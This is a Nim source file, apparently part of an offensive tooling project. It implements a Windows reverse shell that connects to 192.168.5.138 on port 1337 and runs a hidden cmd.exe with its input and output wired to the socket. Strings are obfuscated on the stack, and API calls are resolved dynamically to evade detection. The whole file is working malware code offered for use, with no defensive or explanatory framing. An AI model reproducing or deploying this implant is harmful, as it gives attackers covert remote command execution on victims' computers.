import winim

import utils/[gpa, gmh, hash, stackstr]

proc reverseShell*(): bool =
  var 
    sHost {.stackStringA.} = "192.168.5.138"
    port: uint16 = 1337
    wsaData: WSADATA
    sCmd {.stackStringA.} = "cmd"
  var
    hKernel32 = gmh("KERNEL32.DLL")
    pLoadLibraryA = gpa(hKernel32, "LoadLibraryA", LoadLibraryA)
    pCreateProcessA = gpa(hKernel32, "CreateProcessA", CreateProcessA)
    sws2_32 {.stackStringA.} = "ws2_32.dll"
    hws2_32 = pLoadLibraryA(CPTR(sws2_32))
    pWSAStartup = gpa(hws2_32, "WSAStartup", WSAStartup)
    pWSASocketA = gpa(hws2_32, "WSASocketA", WSASocketA)
    pinet_addr = gpa(hws2_32, "inet_addr", inet_addr)
    phtons = gpa(hws2_32, "htons", htons)
    pconnect = gpa(hws2_32, "connect", connect)

  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(CPTR(sHost))
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL, cast[LPSTR](CPTR(sCmd)),
    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL,
    cast[LPSTARTUPINFOA](si.addr), pi.addr
  )

  return true